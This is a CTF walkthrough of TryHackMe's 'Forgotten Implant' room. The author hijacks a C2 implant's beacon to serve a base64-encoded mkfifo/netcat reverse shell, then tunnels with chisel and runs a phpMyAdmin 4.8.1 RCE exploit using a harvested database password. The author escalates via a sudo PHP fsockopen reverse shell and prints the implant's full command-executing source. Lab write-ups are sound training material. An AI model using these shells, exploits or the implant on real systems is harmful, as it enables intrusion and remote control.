<h1 align="center">Forgotten Implant</h1>
<p align="center">2025, September 8<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>490</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>With almost no attack surface, you must use a forgotten C2 implant to get initial access</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/6069cbaa-6fcd-4cdd-81d7-5eaee3b5afe5"><br>
Access this TryHackMe´s challenge <a href="https://tryhackme.com/room/forgottenimplant ">here </a>.<br>
<img width="1200px" src=" "></p>

<h2>Task 1 . Forgotten Implant</h2>
<p>Welcome to Forgotten Implant!<br>

This is a pretty straightforward CTF-like room in which you will have to get initial access before elevating your privileges. The initial attack surface is quite limited, and you'll have to find a way of interacting with the system.<br>

If you have no prior knowledge of Command and Control (C2), you might want to look at the Intro to C2 room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.<br>

Please allow 3-5 minutes for the VM to boot properly!<br>

Note: While being very linear, this room can be solved in various ways. To get the most out of it, feel free to overengineer your solution to your liking!</p>

<p><em>Answer tbe questions below</em></p>

<br>
<h2>nmap</h2>

```bash
:~/ForgottenImplant#nmap -sT -p- xx.xxx.xx.xx
...
PORT   STATE SERVICE
22/tcp open  ssh
```

<img width="919" height="261" alt="image" src="https://github.com/user-attachments/assets/9ab37d0f-2c18-4519-bc31-c9e13fb98eac" />


<br>
<br>
<h2>nc</h2>

```bash
:~/ForgottenImplant# nc -nlvp 81
Listening on 0.0.0.0 81
```

<h2>tcpdump</h2>

```bash
:~/ForgottenImplant# tcpdump -i ens5
Listening on 0.0.0.0 81
```

<h2>nc</h2>

```bash
:~/ForgottenImplant# nc -nlvp 81
Listening on 0.0.0.0 81
Connection received on xx.xxx.xx.xx 40300
GET
DktMDlUMDE6Mjc6MDIuMDEzODMzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03Mi0xMTYifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9
/heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1
Host: xx.xxx.xx.xxx:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

<img width="1253" height="282" alt="image" src="https://github.com/user-attachments/assets/94b1a7ae-9524-4d8c-8f6c-92e6f03d253e" />

<br>
<br>

```bash
:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
```

<br>
<br>

```bash
:~/ForgottenImplant# echo 'eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0=' | base64 -d
{"time": "2025-xx-xxTxx:xx:xx1.xxxxxx", "systeminfo": {"os": "Linux", "hostname": "ip-xx-xxx-xx-xx"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
```

```bash
:~/ForgottenImplant# python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6MzI6MDIuMDA2MDMzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1" 404 -
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
```

<br>
<br>

```bash
:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
```

```bash
:~/ForgottenImplant# python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
...
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
```

<br>
<h2>ada</h2>

```bash
:~/ForgottenImplant# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xx 52044
bash: cannot set terminal process group (1364): Inappropriate ioctl for device
bash: no job control in this shell
ada@...:~$ pwd
pwd
/home/ada
```

```bash
ada@...:~$ id
id
uid=1001(ada) gid=1001(ada) groups=1001(ada)
```

```bash
ada@...:~$ ls
ls
products.py
user.txt
```

```bash
ada@...:~$ cat user.txt
cat user.txt
THM{********************************}
```

<br>
<p>1.1. What is the root flag?</p>
<br>
<br>

```bash
ada@...:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
ada@...:~$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~# stty raw -echo && fg;
nc -nlvp 4444

ada@...:~$ export TERM=xterm
```

```bash
ada@...:~$ ls -lah
total 44K
drwxr-xr-x 5 ada  ada  4.0K Mar 13  2023 .
drwxr-xr-x 6 root root 4.0K Sep 08  2025 ..
lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ada  ada   220 Jul 10  2022 .bash_logout
-rw-r--r-- 1 ada  ada  3.7K Jul 10  2022 .bashrc
drwx------ 3 ada  ada  4.0K Jul 12  2022 .cache
drwxrwxr-x 2 ada  ada  4.0K Aug 27 20:04 .implant
drwxrwxr-x 4 ada  ada  4.0K Jul 12  2022 .local
-rw-rw-r-- 1 ada  ada   292 Jul 12  2022 products.py
-rw-r--r-- 1 ada  ada   807 Jul 10  2022 .profile
lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .python_history -> /dev/null
-rw-rw-r-- 1 ada  ada    66 Jul 11  2022 .selected_editor
-rw-rw-r-- 1 ada  ada    38 Jul 12  2022 user.txt
```

<h4>products.py</h4>

```bash
ada@...:~$ cat products.py
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='s4Ucbrme'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')
```

<p>

- host = localhost<br>
- database = app<br>
- user = app<br>
- password = s4Ucbrme</p>

<br>
<br>
<h2>mysql</h2>

```bash
ada@...:/home$ mysql -h localhost -u app -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.42-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> use app;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------+
| Tables_in_app |
+---------------+
| products      |
+---------------+
1 row in set (0.00 sec)

mysql> select * from products;
+----+-------------+-------+
| id | product     | stock |
+----+-------------+-------+
|  1 | Black Shirt |     4 |
|  2 | Grey Scarf  |    12 |
|  3 | Pink Hat    |     2 |
+----+-------------+-------+
3  rows in set (0.00 sec)

mysql> exit
Bye
```

<h2>nmap</h2>

```bash
ada@...:/tmp$ wget http://xx.xxx.xx.xxx:8888/nmap-x64.tar.gz -o nmap
```

```bash
ada@...:/tmp$ tar -xzf nmap-x64.tar.gz
```

<p>

- 22 : ssh<br>
- 80 : http<br>
- 3306 : mysql<br>
- 3060 : mysqlx</p>

```bash
ada@...:/tmp$ ./nmap -sT -p- 127.0.0.1
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
33060/tcp open  mysqlx
```

<br>

```bash
ada@...:~$ curl http://localhost:80/
<!DOCTYPE HTML>... href="phpmyadmin.css.php?nocache=4712093054ltr&amp;server=1" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.8.1" media="print" id="printcss"/><title>phpMyAdmin</title><script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.min.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery-migrate.js?v=4.8.1"></script>
<script data-cfasync='false' type='text/javascript' src='js/whitelist.php?v=4.8.1&amp;lang=en'></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/sprintf.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/ajax.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/keyhandler.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery-ui.min.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/js.cookie.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.mousewheel.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.event.drag-2.2.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.validate.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery-ui-timepicker-addon.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.ba-hashchange-1.3.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.debounce-1.0.5.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/menu-resizer.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/cross_framing_protection.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/rte.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/tracekit.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/error_report.js?v=4.8.1"></script>
<script data-cfasync='false' type='text/javascript' src='js/messages.php?l=en&amp;v=4.8.1&amp;lang=en'></script>
<script data-cfasync="false" type="text/javascript" src="js/config.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/doclinks.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/functions.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/navigation.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/indexes.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/common.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/page_settings.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/shortcuts_handler.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/codemirror/lib/codemirror.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/codemirror/mode/sql/sql.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/codemirror/addon/runmode/runmode.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/codemirror/addon/hint/show-hint.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/codemirror/addon/hint/sql-hint.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/vendor/codemirror/addon/lint/lint.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/codemirror/addon/lint/sql-lint.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript" src="js/console.js?v=4.8.1"></script>
<script data-cfasync="false" type="text/javascript">// <![CDATA[
PMA_commonParams.setAll({common_query:"?lang=en",opendb_url:"db_structure.php",lang:"en",server:"1",table:"",db:"",token:";)pB/Sc^o8D}pw%?",text_dir:"ltr",show_databases_navigation_as_tree:true,pma_text_default_tab:"Browse",pma_text_left_default_tab:"Structure",pma_text_left_default_tab2:false,LimitChars:"50",pftext:"",confirm:true,LoginCookieValidity:"1440",session_gc_maxlifetime:"1440",logged_in:false,is_https:false,rootPath:"/",arg_separator:"&",PMA_VERSION:"4.8.1",auth_type:"cookie",user:"root"});
ConsoleEnterExecutes=false
AJAX.scriptHandler.add("vendor/jquery/jquery.min.js",0).add("vendor/jquery/jquery-migrate.js",0).add("whitelist.php",1).add("vendor/sprintf.js",1).add("ajax.js",0).add("keyhandler.js",1).add("vendor/jquery/jquery-ui.min.js",0).add("vendor/js.cookie.js",1).add("vendor/jquery/jquery.mousewheel.js",0).add("vendor/jquery/jquery.event.drag-2.2.js",0).add("vendor/jquery/jquery.validate.js",0).add("vendor/jquery/jquery-ui-timepicker-addon.js",0).add("vendor/jquery/jquery.ba-hashchange-1.3.js",0).add("vendor/jquery/jquery.debounce-1.0.5.js",0).add("menu-resizer.js",1).add("cross_framing_protection.js",0).add("rte.js",1).add("vendor/tracekit.js",1).add("error_report.js",1).add("messages.php",0).add("config.js",1).add("doclinks.js",1).add("functions.js",1).add("navigation.js",1).add("indexes.js",1).add("common.js",1).add("page_settings.js",1).add("shortcuts_handler.js",1).add("vendor/codemirror/lib/codemirror.js",0).add("vendor/codemirror/mode/sql/sql.js",0).add("vendor/codemirror/addon/runmode/runmode.js",0).add("vendor/codemirror/addon/hint/show-hint.js",0).add("vendor/codemirror/addon/hint/sql-hint.js",0).add("vendor/codemirror/addon/lint/lint.js",0).add("codemirror/addon/lint/sql-lint.js",0).add("console.js",1);
$(function() {AJAX.fireOnload("whitelist.php");AJAX.fireOnload("vendor/sprintf.js");AJAX.fireOnload("keyhandler.js");AJAX.fireOnload("vendor/js.cookie.js");AJAX.fireOnload("menu-resizer.js");AJAX.fireOnload("rte.js");AJAX.fireOnload("vendor/tracekit.js");AJAX.fireOnload("error_report.js");AJAX.fireOnload("config.js");AJAX.fireOnload("doclinks.js");AJAX.fireOnload("functions.js");AJAX.fireOnload("navigation.js");AJAX.fireOnload("indexes.js");AJAX.fireOnload("common.js");AJAX.fireOnload("page_settings.js");AJAX.fireOnload("shortcuts_handler.js");AJAX.fireOnload("console.js");});
// ]]></script><noscript><style>html{display:block}</style></noscript></head><body id='loginform'><div id="page_content"><div class="container">
<a href="./url.php?url=https%3A%2F%2Fwww.phpmyadmin.net%2F" target="_blank" rel="noopener noreferrer" class="logo">
```    
    
<img src="./themes/pmahomme/img/logo_right.png" id="imLogo" name="imLogo" alt="phpMyAdmin" border="0" />

<br>
<br>

<p>
    
- Welcome to ...phpMyAdmin</bdo></p>

```bash
<noscript>
<div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" /> Javascript must be enabled past this point!</div>
</noscript>

<div class="hide" id="js-https-mismatch">
<div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" /> There is mismatch between HTTPS indicated on the server and client. This can lead to non working phpMyAdmin or a security risk. Please fix your server configuration to indicate HTTPS properly.</div>
</div>

    <br />
    <!-- Login form -->
    <form method="post" id="login_form" action="index.php" name="login_form" class="disableAjax login hide js-show">
        <fieldset>
        <legend><input type="hidden" name="set_session" value="vp68fj0cb2i9b2v8jtnskeh55e" />Log in<a href="./url.php?url=https%3A%2F%2Fdocs.phpmyadmin.net%2Fen%2Flatest%2Findex.html" target="documentation"><img src="themes/dot.gif" title="Documentation" alt="Documentation" class="icon ic_b_help" /></a></legend><div class="item">
                <label for="input_username">Username:</label>
                <input type="text" name="pma_username" id="input_username" value="" size="24" class="textfield"/>
            </div>
            <div class="item">
                <label for="input_password">Password:</label>
                <input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield" />
            </div>    <input type="hidden" name="server" value="1" /></fieldset><fieldset class="tblFooters"><input value="Go" type="submit" id="input_go" /><input type="hidden" name="target" value="index.php" /><input type="hidden" name="lang" value="en" /><input type="hidden" name="token" value=";)pB/Sc^o8D}pw%?" /></fieldset>
    </form></div>
``` 

<br>
<h2>chisel</h2>

```bash
:~/ForgottenImplant#chisel server --reverse --port 1234
2025/09/xx xx:xx:xx server: Reverse tunnelling enabled
2025/09/xx xx:xx:xx server: Fingerprint R9KZw1WfMdiIEF9X6AKUOp7jJtxikqCAKR4yi104tD8=
2025/09/xx xx:xx:xx server: Listening on http://0.0.0.0:1234
2025/09/xx xx:xx:xx server: session#1: tun: proxy#R:5000=>80: Listening
``` 

```bash
ada@...:/tmp$ wget http://xx.xxx.xx.xxx:xxxx/chisel
--2025-09-xx xx:xx:xx--  http://xx.xxx.xx.xxx:xxxx/chisel
Connecting to xx.xxx.xx.xxx:xxxx... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8339456 (8.0M) [application/octet-stream]
Saving to: \u2018chisel\u2019

chisel              100%[===================>]   7.95M  --.-KB/s    in 0.04s   

2025-09-xx xx:xx:xx (182 MB/s) - \u2018chisel\u2019 saved [8339456/8339456]
``` 

```bash
ada@...:/tmp$ chmod +x chisel  
``` 

```bash
2025/09/xx xx:xx:xx client: Connecting to ws://xx.xxx.xx.xxx:123400:127.0.0.1:80 
2025/09/xx xx:xx:xx client: Connected (Latency 677.193µs)
``` 

<img width="1325" height="448" alt="image" src="https://github.com/user-attachments/assets/859f1b52-d9a1-4ccc-a93c-a304c05d3f49" />

<img width="1119" height="815" alt="image" src="https://github.com/user-attachments/assets/daebc076-bba7-4bb8-b6ce-6aedee8ad427" />


<br>
<br>

```bash
:~/ForgottenImplant# python3 50457.py 127.0.0.1 5000 / app s4Ucbrme 'sudo -l'
Start tag: html
Start tag: body
Start tag: h1
Data: Hello, Rosana!
End tag: h1
End tag: body
End tag: html
Matching Defaults entries for www-data on ip-xx-xxx-xx-xx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-xx-xxx-xx-xx:
    (root) NOPASSWD: /usr/bin/php
``` 


```bash
"sudo php -r ‘$sock=fsockopen(xx.xxx.xx.xxx,xxxx);exec(“/bin/bash <&3 >&3 2>&3”);’"
``` 


<br>
<h2>CVE-2018-12613</h2>

```bash
:~/ForgottenImplant# searchsploit phpmyadmin 4.8.1
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE | php/webapps/50457.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
``` 

```bash
:~/ForgottenImplant#searchsploit -m php/webapps/50457.py
  Exploit: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50457
     Path: /opt/exploitdb/exploits/php/webapps/50457.py
    Codes: CVE-2018-12613
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/50457.py
``` 

```bash
ada@i...:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       forgottenimplant
127.0.0.1       ip6-localhost ip6-loopback
``` 

```bash
ada@...:/home$ getent passwd
root:x:0:0:root:/root:/bin/bash
...
fi:x:1000:1000:fi:/home/fi:/bin/bash
...
ada:x:1001:1001:,,,:/home/ada:/bin/bash
...
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
``` 

```bash
ada@...:~$ systemctl --type=service --state=running
UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                >
  accounts-daemon.service     loaded active running Accounts Service           >
  amazon-ssm-agent.service    loaded active running amazon-ssm-agent           >
  apache2.service             loaded active running The Apache HTTP Server     >
  atd.service                 loaded active running Deferred execution schedule>
  cron.service                loaded active running Regular background program >
  dbus.service                loaded active running D-Bus System Message Bus   
``` 

```bash
ada@...:/var/www/phpmyadmin$ ls
ajax.php                  robots.txt
browse_foreigners.php     schema_export.php
ChangeLog                 scripts
changelog.php             server_binlog.php
``` 


```bash
ada@...:/var/www/phpmyadmin/scripts$ ls
advisor2po            phpunit-top-tests
create-release.sh     remove-incomplete-mo
fix-po-twig           transformations_generator_main_class.sh
generate-mo           transformations_generator_plugin.sh
generate-twig-cache   update-po
lang-cleanup.sh       upload-release
locales-contributors
``` 

```bash
ada@...:/home$ ls
ada  fi  ssm-user  ubuntu
```

```bash
ada@...:~$ cd .implant
ada@...:~/.implant$ ls -lah
total 24K
drwxrwxr-x 2 ada  ada  4.0K Sep 08 20:04 .
drwxr-xr-x 5 ada  ada  4.0K Mar 13  2023 ..
-rw-rw-r-- 1 ada  ada  7.7K Aug 27 20:57 10.201.20.196.log
-rw-r--r-- 1 root root   14 Aug 27 20:03 hosts
-rw-rw-r-- 1 ada  ada  3.7K Mar 13  2023 implant.py
``` 


```bash
ada@...:~/.implant$ cat implant.py
import base64
import binascii
import json
import platform
import subprocess
import time
from datetime import datetime
from pathlib import Path

import requests


def systeminfo():
    return {
        'os': platform.system(),
        'hostname': platform.node(),
    }


class Commander:
    def __init__(self, host, log_dir, port=81):
        self.log_dir = Path(log_dir)
        self.log_file = self.log_dir / f'{host}.log'
        self.port = port
        self.host = host

        try:
            self.log = json.loads(self.log_file.read_text())
        except FileNotFoundError:
            self.log = {'heartbeats': [], 'jobs': [{'job_id': 0, 'cmd': 'whoami'}]}
            self.save_log()

    def encode_message(self, message):
        return base64.b64encode(message.encode('utf-8')).decode('utf-8')

    def decode_message(self, message):
        return base64.b64decode(message).decode('utf-8')
    
    def save_log(self):
        self.log_file.write_text(json.dumps(self.log))

    def send_c2_message(self, endpoint, message):
        try:
            message = self.encode_message(json.dumps(message))
            r = requests.get(f'http://{self.host}:{self.port}/{endpoint}/{message}')

            return r.text
        except requests.exceptions.ConnectionError:
            raise ConnectionError('Could not connect to C2')

    def send_heartbeat(self):
        heartbeat = {
            'time': datetime.now().isoformat(),
            'systeminfo': systeminfo(),
            'latest_job': self.log['jobs'][-1] if len(self.log['jobs']) > 0 else None,
            'success': False
        }

        try:
            self.send_c2_message('heartbeat', heartbeat)

            heartbeat['success'] = True
            self.log['heartbeats'].append(heartbeat)
        except ConnectionError:
            self.log['heartbeats'].append(heartbeat)
            print('Could not send heartbeat')

    def execute_cmd(self, command):
        try:
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
            output, err = p.communicate()
            return output.decode('utf-8')
        except Exception as e:
            print(e)
            return False

    def get_job(self, job_id='latest'):
        try:
            job = self.send_c2_message('get-job', job_id)
            job = json.loads(self.decode_message(job))
            self.log['jobs'].append(job)

            if 'cmd' in job:
                job['success'] = True
                job['result'] = self.execute_cmd(job['cmd'])
                self.send_c2_message('job-result', job)
            else:
                job['success'] = False
                job['result'] = 'No command'
                self.send_c2_message('job-result', job)
        except ConnectionError:
            print('Could not get job')
        except TypeError:
            print('Job formatting error')
        except json.JSONDecodeError:
            job = {'success': False, 'result': 'JSON error'}
            self.send_c2_message('job-result', job)
            print('JSON error')    
        except binascii.Error:
            job = {'success': False, 'result': 'Encoding error'}
            self.send_c2_message('job-result', job)
            print('Encoding error')
        except Exception as e:
            print(f'Job execution error ({e})')


if __name__ == "__main__":
    log_dir = Path('/home/ada/.implant')
    hosts_file = Path('/home/ada/.implant/hosts')

    if hosts_file.exists():
        hosts = hosts_file.read_text().split('\n')

        commanders = [Commander(host, log_dir) for host in hosts if host != '']

        for commander in commanders:
            commander.send_heartbeat()
            time.sleep(1)
            commander.get_job()
            commander.save_log()
``` 





